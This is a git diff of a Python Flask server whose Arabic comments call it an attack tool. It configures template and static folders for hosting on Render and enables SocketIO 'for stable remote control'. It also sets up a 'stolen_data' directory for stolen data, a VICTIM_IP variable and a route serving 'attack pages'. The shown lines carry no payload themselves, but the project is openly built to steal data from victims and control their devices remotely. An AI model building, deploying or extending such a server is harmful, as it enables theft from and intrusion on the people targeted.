@@ -5,16 +5,19 @@ import base64
 from datetime import datetime
 from flask import Flask, request, jsonify, render_template, send_file
 from flask_socketio import SocketIO
-import logging
 
-# 1. إعداد التطبيق (Flask سيبحث تلقائياً في مجلد templates و static)
-app = Flask(__name__)
+# 1. إعداد التطبيق مع تحديد المجلدات بدقة لضمان عملها على Render
+app = Flask(__name__, 
+            template_folder='templates', 
+            static_folder='static',
+            static_url_path='/static')
+
 app.config['SECRET_KEY'] = 'cairopy_sec_2024'
 
-# 2. إعداد SocketIO مع وضع gevent ليعمل على Render بدون مشاكل
+# 2. إعداد SocketIO مع وضع gevent لضمان استقرار التحكم عن بُعد
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent')
 
-# 3. إعداد مسارات حفظ البيانات المسروقة
+# 3. إعداد مسارات حفظ البيانات المسروقة (تنشأ تلقائياً)
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 STOLEN_DIR = os.path.join(BASE_DIR, "stolen_data")
 
@@ -24,7 +27,7 @@ for folder in folders:
 
 VICTIM_IP = "Unknown"
 
-# ========== صفحات الهجوم (تأكد أن الملفات داخل مجلد templates) ==========
+# ========== مسارات صفحات الهجوم (داخل مجلد templates) ==========
 @app.route('/')
 def index_attack():
     return render_template('index.html')
